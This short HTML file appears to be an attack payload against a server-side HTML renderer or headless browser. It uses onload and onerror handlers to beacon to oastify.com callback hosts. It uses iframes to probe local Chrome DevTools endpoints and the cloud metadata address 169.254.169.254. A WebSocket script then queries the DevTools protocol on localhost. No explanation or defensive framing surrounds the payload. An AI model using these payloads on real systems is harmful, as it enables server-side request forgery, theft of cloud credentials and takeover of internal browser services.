Hello
<body onload="setTimeout(function(){var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://7u2mvavbiotucxmybqdphq1o6fc60zoo.oastify.com', true); xhr.send();}, 1000);">


1st
<iframe src="http://localhost:3000/json" width="800" height="600"></iframe>
2nd
<iframe src="http://localhost:3000/json/version" width="800" height="600"></iframe>
3rd
<iframe src="http://169.254.169.254/latest" width="800" height="600"></iframe>
4th
<iframe src="https://app.adora.so" width="800" height="600"></iframe>
5th
<object data="https://example.com" type="video/mp4" width="600" height="400"></object>
6th
<div id="output"></div>
<script>
  var ws = new WebSocket('ws://localhost:3000');
  ws.onerror = console.error;
  ws.onclose = console.log;
  ws.onmessage = ev => {
    document.getElementById('output').innerText = ev.data;
  };
  ws.onopen = () => {
    ws.send(JSON.stringify({ "id": 1, "method": "Browser.getVersion" }))
  };
</script>



<img src="image.png", onerror="setTimeout(function(){var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://dyfszgzhmux0g3q4fwhvlw5ualgc44st.oastify.com', true); xhr.send();}, 1000);">

